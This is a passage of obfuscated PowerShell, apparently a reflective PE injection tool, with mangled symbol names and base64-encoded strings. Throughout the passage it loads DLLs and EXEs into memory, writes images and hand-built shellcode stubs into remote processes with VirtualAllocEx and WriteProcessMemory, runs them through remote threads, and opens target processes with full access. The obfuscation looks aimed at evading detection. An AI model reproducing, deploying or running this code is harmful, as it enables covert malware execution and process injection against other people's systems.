		if (([Int] ${_/=\/====\/\/==\_/}.DllCharacteristics -band ${_____/\__/\/\/\/\/}.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne ${_____/\__/\/\/\/\/}.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuAA=='))) -WarningAction Continue
			[IntPtr]${/===\_/\/\/=\/===} = ${_/=\/==\/====\_/\/}
		}
		${_/====\_/\/======\} = [IntPtr]::Zero				
		${______/\____/\/=\} = [IntPtr]::Zero		
		if (${/=\_/=\/\_____/==} -eq $true)
		{
			${_/====\_/\/======\} = ${_/=\/\/\/\____/\/=}.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${_/=\/====\/\/==\_/}.SizeOfImage, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_READWRITE)
			${______/\____/\/=\} = ${_/=\/\/\/\____/\/=}.VirtualAllocEx.Invoke(${__/=\_/\___/\_/\/=}, ${/===\_/\/\/=\/===}, [UIntPtr]${_/=\/====\/\/==\_/}.SizeOfImage, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE)
			if (${______/\____/\/=\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
			}
		}
		else
		{
			if (${__/\/\/\/\_/=\/\_} -eq $true)
			{
				${_/====\_/\/======\} = ${_/=\/\/\/\____/\/=}.VirtualAlloc.Invoke(${/===\_/\/\/=\/===}, [UIntPtr]${_/=\/====\/\/==\_/}.SizeOfImage, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_READWRITE)
			}
			else
			{
				${_/====\_/\/======\} = ${_/=\/\/\/\____/\/=}.VirtualAlloc.Invoke(${/===\_/\/\/=\/===}, [UIntPtr]${_/=\/====\/\/==\_/}.SizeOfImage, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE)
			}
			${______/\____/\/=\} = ${_/====\_/\/======\}
		}
		[IntPtr]${_/\/=\/=\______/\} = _/===\/==\/======\ (${_/====\_/\/======\}) ([Int64]${_/=\/====\/\/==\_/}.SizeOfImage)
		if (${_/====\_/\/======\} -eq [IntPtr]::Zero)
		{ 
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
		}		
		[System.Runtime.InteropServices.Marshal]::Copy(${___/==\_/\___/\/=\}, 0, ${_/====\_/\/======\}, ${_/=\/====\/\/==\_/}.SizeOfHeaders) | Out-Null
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
		${_/=\/====\/\/==\_/} = _/=\____/=\/\_/\__ -_/====\_/\/======\ ${_/====\_/\/======\} -_____/=\_____/\__/ ${_____/=\_____/\__/} -_____/\__/\/\/\/\/ ${_____/\__/\/\/\/\/}
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${_/\/=\/=\______/\}
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${______/\____/\/=\}
		Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AEEAZABkAHIAZQBzAHMAOgAgACQAewBfAC8APQA9AD0APQBcAF8ALwBcAC8APQA9AD0APQA9AD0AXAB9ACAAIAAgACAARQBuAGQAQQBkAGQAcgBlAHMAcwA6ACAAJAB7AF8ALwBcAC8APQBcAC8APQBcAF8AXwBfAF8AXwBfAC8AXAB9AA==')))
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
		_/===\/==\_/\/=\/\ -___/==\_/\___/\/=\ ${___/==\_/\___/\/=\} -_/=\/====\/\/==\_/ ${_/=\/====\/\/==\_/} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=} -_____/=\_____/\__/ ${_____/=\_____/\__/}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
		__/=\/\__/=\_/\__/ -_/=\/====\/\/==\_/ ${_/=\/====\/\/==\_/} -_/=\/==\/====\_/\/ ${_/=\/==\/====\_/\/} -_____/\__/\/\/\/\/ ${_____/\__/\/\/\/\/} -_____/=\_____/\__/ ${_____/=\_____/\__/}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
		if (${/=\_/=\/\_____/==} -eq $true)
		{
			_/==\____/=\_/\/\/ -_/=\/====\/\/==\_/ ${_/=\/====\/\/==\_/} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=} -_____/=\_____/\__/ ${_____/=\_____/\__/} -_____/\__/\/\/\/\/ ${_____/\__/\/\/\/\/} -__/=\_/\___/\_/\/= ${__/=\_/\___/\_/\/=}
		}
		else
		{
			_/==\____/=\_/\/\/ -_/=\/====\/\/==\_/ ${_/=\/====\/\/==\_/} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=} -_____/=\_____/\__/ ${_____/=\_____/\__/} -_____/\__/\/\/\/\/ ${_____/\__/\/\/\/\/}
		}
		if (${/=\_/=\/\_____/==} -eq $false)
		{
			if (${__/\/\/\/\_/=\/\_} -eq $true)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
				__/\/\_/\/\_/====\ -_/=\/====\/\/==\_/ ${_/=\/====\/\/==\_/} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=} -_____/\__/\/\/\/\/ ${_____/\__/\/\/\/\/} -_____/=\_____/\__/ ${_____/=\_____/\__/}
			}
			else
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
			}
		}
		else
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
		}
		if (${/=\_/=\/\_____/==} -eq $true)
		{
			[UInt32]${/=\/==\__/\_/\__/} = 0
			${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.WriteProcessMemory.Invoke(${__/=\_/\___/\_/\/=}, ${______/\____/\/=\}, ${_/====\_/\/======\}, [UIntPtr](${_/=\/====\/\/==\_/}.SizeOfImage), [Ref]${/=\/==\__/\_/\__/})
			if (${______/\/\_/=\_/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
		}
		if (${_/=\/====\/\/==\_/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			if (${/=\_/=\/\_____/==} -eq $false)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
				${__/\/=\__/\_/\/=\} = _/===\/==\/======\ (${_/=\/====\/\/==\_/}.PEHandle) (${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${_/=\_____/\______} = _/==\/====\_/=\_/\ @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${_____/=\___/\/===} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\/=\__/\_/\/=\}, ${_/=\_____/\______})
				${_____/=\___/\/===}.Invoke(${_/=\/====\/\/==\_/}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${__/\/=\__/\_/\/=\} = _/===\/==\/======\ (${______/\____/\/=\}) (${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${_/=\/====\/\/==\_/}.PE64Bit -eq $true)
				{
					${_/\/=======\/=\__} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${/=\_/======\_/===} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${/=\__/\/\_/=\__/\} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${_/\/=======\/=\__} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${/=\_/======\_/===} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${/=\__/\/\_/=\__/\} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${/=====\/===\_/=\/} = ${_/\/=======\/=\__}.Length + ${/=\_/======\_/===}.Length + ${/=\__/\/\_/=\__/\}.Length + (${_/=\/\/==\_/\_/==} * 2)
				${/=\/\_/=\/\___/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=====\/===\_/=\/})
				${/====\/===\/\/\/=} = ${/=\/\_/=\/\___/\/}
				______/\____/\/=\/ -___/=====\/====\/\ ${_/\/=======\/=\__} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
				${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/\/=======\/=\__}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${______/\____/\/=\}, ${/=\/\_/=\/\___/\/}, $false)
				${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\/\/==\_/\_/==})
				______/\____/\/=\/ -___/=====\/====\/\ ${/=\_/======\_/===} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
				${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${/=\_/======\_/===}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\/=\__/\_/\/=\}, ${/=\/\_/=\/\___/\/}, $false)
				${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\/\/==\_/\_/==})
				______/\____/\/=\/ -___/=====\/====\/\ ${/=\__/\/\_/=\__/\} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
				${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${/=\__/\/\_/=\__/\}.Length)
				${___/==\_/====\_/\} = ${_/=\/\/\/\____/\/=}.VirtualAllocEx.Invoke(${__/=\_/\___/\_/\/=}, [IntPtr]::Zero, [UIntPtr][UInt64]${/=====\/===\_/=\/}, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE)
				if (${___/==\_/====\_/\} -eq [IntPtr]::Zero)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
				}
				${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.WriteProcessMemory.Invoke(${__/=\_/\___/\_/\/=}, ${___/==\_/====\_/\}, ${/====\/===\/\/\/=}, [UIntPtr][UInt64]${/=====\/===\_/=\/}, [Ref]${/=\/==\__/\_/\__/})
				if ((${______/\/\_/=\_/\} -eq $false) -or ([UInt64]${/=\/==\__/\_/\__/} -ne [UInt64]${/=====\/===\_/=\/}))
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
				}
				${_/\____/=\__/\/\_} = _/==\/==\__/\_____ -__/=\/\/=\__/\/==\ ${__/=\_/\___/\_/\/=} -__/\/==\_/\/==\/\/ ${___/==\_/====\_/\} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=}
				${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.WaitForSingleObject.Invoke(${_/\____/=\__/\/\_}, 20000)
				if (${/===\/==\_/\/\/\_} -ne 0)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
				}
				${_/=\/\/\/\____/\/=}.VirtualFreeEx.Invoke(${__/=\_/\___/\_/\/=}, ${___/==\_/====\_/\}, [UIntPtr][UInt64]0, ${_____/\__/\/\/\/\/}.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${_/=\/====\/\/==\_/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
		{
			[IntPtr]${__/====\_/\__/\__/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${__/====\_/\__/\__/}, 0, 0x00)
			${_/=\/=\/=\____/==} = _/=\/\_/=\_/=\___/ -_/=\/====\/\/==\_/ ${_/=\/====\/\/==\_/} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=} -_____/\__/\/\/\/\/ ${_____/\__/\/\/\/\/} -___/=\_/\/\__/=\__ ${__/\/\/=\_/\______} -__/====\_/\__/\__/ ${__/====\_/\__/\__/}
			[IntPtr]${__/==\/=\/==\__/=} = _/===\/==\/======\ (${_/=\/====\/\/==\_/}.PEHandle) (${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAEUAWABFACAATQBhAGkAbgAgAGYAdQBuAGMAdABpAG8AbgAuACAAQQBkAGQAcgBlAHMAcwA6ACAAJAB7AF8AXwAvAD0APQBcAC8APQBcAC8APQA9AFwAXwBfAC8APQB9AC4AIABDAHIAZQBhAHQAaQBuAGcAIAB0AGgAcgBlAGEAZAAgAGYAbwByACAAdABoAGUAIABFAFgARQAgAHQAbwAgAHIAdQBuACAAaQBuAC4A')))
			${_/=\/\/\/\____/\/=}.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${__/==\/=\/==\__/=}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]${__/\__/\_/\/\__/\} = [System.Runtime.InteropServices.Marshal]::ReadByte(${__/====\_/\__/\__/}, 0)
				if (${__/\__/\_/\/\__/\} -eq 1)
				{
					___/=\/====\__/=== -____/==\/\__/====\ ${_/=\/=\/=\____/==} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=} -_____/\__/\/\/\/\/ ${_____/\__/\/\/\/\/}
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
					break
				}
				else
				{
					sleep -Seconds 1
				}
			}
		}
		return @(${_/=\/====\/\/==\_/}.PEHandle, ${______/\____/\/=\})
	}
	Function __/=\_/\/\__/===\/
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${_/====\_/\/======\}
		)
		${_____/\__/\/\/\/\/} = __/\_/=\_/\/\__/=\
		${_/=\/\/\/\____/\/=} = __/\____/\/==\___/
		${_____/=\_____/\__/} = ___/\/=====\__/=\_
		${_/=\/====\/\/==\_/} = _/=\____/=\/\_/\__ -_/====\_/\/======\ ${_/====\_/\/======\} -_____/=\_____/\__/ ${_____/=\_____/\__/} -_____/\__/\/\/\/\/ ${_____/\__/\/\/\/\/}
		if (${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${_/\/\____/==\/\/\} = _/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.PEHandle) ([Int64]${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${_/\/=\/\___/==\__} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/\____/==\/\/\}, [Type]${_____/=\_____/\__/}.IMAGE_IMPORT_DESCRIPTOR)
				if (${_/\/=\/\___/==\__}.Characteristics -eq 0 `
						-and ${_/\/=\/\___/==\__}.FirstThunk -eq 0 `
						-and ${_/\/=\/\___/==\__}.ForwarderChain -eq 0 `
						-and ${_/\/=\/\___/==\__}.Name -eq 0 `
						-and ${_/\/=\/\___/==\__}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
					break
				}
				${_/\_/=\_/\_/\/==\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((_/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.PEHandle) ([Int64]${_/\/=\/\___/==\__}.Name)))
				${_/===\_/\_/==\___} = ${_/=\/\/\/\____/\/=}.GetModuleHandle.Invoke(${_/\_/=\_/\_/\/==\})
				if (${_/===\_/\_/==\___} -eq $null)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwBlAHQAdABpAG4AZwAgAEQATABMACAAaABhAG4AZABsAGUAIABpAG4AIABNAGUAbQBvAHIAeQBGAHIAZQBlAEwAaQBiAHIAYQByAHkALAAgAEQATABMAE4AYQBtAGUAOgAgACQAewBfAC8AXABfAC8APQBcAF8ALwBcAF8ALwBcAC8APQA9AFwAfQAuACAAQwBvAG4AdABpAG4AdQBpAG4AZwAgAGEAbgB5AHcAYQB5AHMA'))) -WarningAction Continue
				}
				${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.FreeLibrary.Invoke(${_/===\_/\_/==\___})
				if (${______/\/\_/=\_/\} -eq $false)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAHIAZQBlACAAbABpAGIAcgBhAHIAeQA6ACAAJAB7AF8ALwBcAF8ALwA9AFwAXwAvAFwAXwAvAFwALwA9AD0AXAB9AC4AIABDAG8AbgB0AGkAbgB1AGkAbgBnACAAYQBuAHkAdwBhAHkAcwAuAA=='))) -WarningAction Continue
				}
				${_/\/\____/==\/\/\} = _/===\/==\/======\ (${_/\/\____/==\/\/\}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_____/=\_____/\__/}.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
		${__/\/=\__/\_/\/=\} = _/===\/==\/======\ (${_/=\/====\/\/==\_/}.PEHandle) (${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${_/=\_____/\______} = _/==\/====\_/=\_/\ @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${_____/=\___/\/===} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\/=\__/\_/\/=\}, ${_/=\_____/\______})
		${_____/=\___/\/===}.Invoke(${_/=\/====\/\/==\_/}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.VirtualFree.Invoke(${_/====\_/\/======\}, [UInt64]0, ${_____/\__/\/\/\/\/}.MEM_RELEASE)
		if (${______/\/\_/=\_/\} -eq $false)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
		}
	}
	Function ___/\/====\/\/====
	{
		${_/=\/\/\/\____/\/=} = __/\____/\/==\___/
		${_____/=\_____/\__/} = ___/\/=====\__/=\_
		${_____/\__/\/\/\/\/} =  __/\_/=\_/\/\__/=\
		${__/=\_/\___/\_/\/=} = [IntPtr]::Zero
		if ((${/=\/=\/\/\__/==\_} -ne $null) -and (${/=\/=\/\/\__/==\_} -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			${/=\_/\/====\/\/=\} = @(ps -Name $ProcName -ErrorAction SilentlyContinue)
			if (${/=\_/\/====\/\/=\}.Count -eq 0)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAZgBpAG4AZAAgAHAAcgBvAGMAZQBzAHMAIAAkAFAAcgBvAGMATgBhAG0AZQA=')))
			}
			elseif (${/=\_/\/====\/\/=\}.Count -gt 1)
			{
				${__/=\___/\___/===} = ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId
				echo ${__/=\___/\___/===}
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAHQAaABhAG4AIABvAG4AZQAgAGkAbgBzAHQAYQBuAGMAZQAgAG8AZgAgACQAUAByAG8AYwBOAGEAbQBlACAAZgBvAHUAbgBkACwAIABwAGwAZQBhAHMAZQAgAHMAcABlAGMAaQBmAHkAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABJAEQAIAB0AG8AIABpAG4AagBlAGMAdAAgAGkAbgAgAHQAbwAuAA==')))
			}
			else
			{
				${/=\/=\/\/\__/==\_} = ${/=\_/\/====\/\/=\}[0].ID
			}
		}
		if ((${/=\/=\/\/\__/==\_} -ne $null) -and (${/=\/=\/\/\__/==\_} -ne 0))
		{
			${__/=\_/\___/\_/\/=} = ${_/=\/\/\/\____/\/=}.OpenProcess.Invoke(0x001F0FFF, $false, ${/=\/=\/\/\__/==\_})
			if (${__/=\_/\___/\_/\/=} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbwBiAHQAYQBpAG4AIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIABwAHIAbwBjAGUAcwBzACAASQBEADoAIAAkAHsALwA9AFwALwA9AFwALwBcAC8AXABfAF8ALwA9AD0AXABfAH0A')))
			}
